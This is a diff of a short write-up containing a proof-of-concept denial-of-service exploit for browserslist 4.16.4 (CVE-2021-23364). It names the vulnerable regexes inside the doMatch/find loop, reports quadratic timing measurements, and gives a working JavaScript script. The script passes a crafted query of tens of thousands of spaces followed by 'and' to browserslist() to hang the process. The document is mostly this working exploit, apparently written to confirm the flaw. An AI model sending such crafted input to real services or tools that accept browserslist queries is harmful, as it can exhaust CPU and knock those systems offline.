@@ -1,17 +1,20 @@
-Confirmed: the ReDoS is in browserslist's `doMatch`/`find` chain (the `.match()` call at index.js), with quadratic blowup verified locally (50k spaces → 2.8s, 100k spaces → 11.1s).
+Confirmed quadratic blowup (4x input → 4x time), consistent with the known ReDoS in `doMatch`'s use of `String.prototype.match` against `/^\s+and\s+(.*)/i` / `/^(?:,\s*|\s+or\s+)(.*)/i` inside the backward-scanning `find` loop. This is CVE-2021-23364 in browserslist 4.16.4.
 
 ```javascript
-// Denial of Service in browserslist's query matching (doMatch/find -> String.prototype.match)
-// A crafted query string causes quadratic-time regex matching, hanging the process.
+// ReDoS exploit for browserslist's internal query matcher (`.match()` calls in doMatch/find)
+// Affected: browserslist 4.16.4 (CVE-2021-23364)
 const browserslist = require("./node_modules/browserslist");
 
-const malicious = " ".repeat(100000) + "and";
+const malicious = " ".repeat(80000) + "and"; // crafted query string
 
-console.time("browserslist-redos");
+console.log("Sending malicious query to browserslist()...");
+const start = Date.now();
+
 try {
   browserslist(malicious);
 } catch (e) {
-  // parsing still completes only after the expensive quadratic scan
+  // parsing still fails, but only after the expensive match() scanning below
 }
-console.timeEnd("browserslist-redos");
+
+console.log("Elapsed ms:", Date.now() - start);
 ```
